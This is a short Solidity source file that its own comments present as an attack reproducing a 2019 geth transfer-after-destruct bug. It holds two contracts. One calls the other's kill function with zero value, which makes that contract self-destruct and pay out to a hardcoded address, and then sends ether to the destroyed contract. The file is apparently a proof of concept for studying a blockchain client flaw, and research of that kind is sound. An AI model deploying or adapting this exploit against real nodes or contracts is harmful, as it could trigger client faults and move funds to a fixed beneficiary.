// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

// The attack involves exploiting a transfer-after-destruct bug that was in geth in 2019
// It involves sending sending eth to a contract that contains a function which self destructs,
// if the msg.value is 0 and does anything else if it is non-zero.

//Sends ETH
contract B {
    A public a;
    address payable a_addr;

    constructor() payable {
        a = new A();
        address addr = address(a);
        a_addr = payable(addr);
    }

    function getBalance() external view returns(uint) {
        return address(this).balance;
    }

    function finalStuff() external {
        a.kill{ value: 1 ether }(); // call with 1
    }

    function doAttack() external {
        a.kill{ value: 0 ether }(); // call with 0
        a.kill{ value: 2 ether }(); // call with 2
    }
}

// Receives ETH
contract A {
    address me = 0x098AF020B70ed8ef8F53e2ad01312f6993a5c8a4;
    uint public amount;

    event Deposit(
        address indexed from,
        string value
    );

    function test() external pure returns(uint) {
        return 123;
    }

    function getBalance() external view returns(uint) {
        return address(this).balance;
    }

    function kill() external payable {
        if (msg.value == 0) {
            emit Deposit(msg.sender, "Self destructing....");
            selfdestruct(payable(me));
        } else {
            amount += msg.value;
            emit Deposit(msg.sender, "Else statement...");
        }
    }

    receive() external payable {}
}
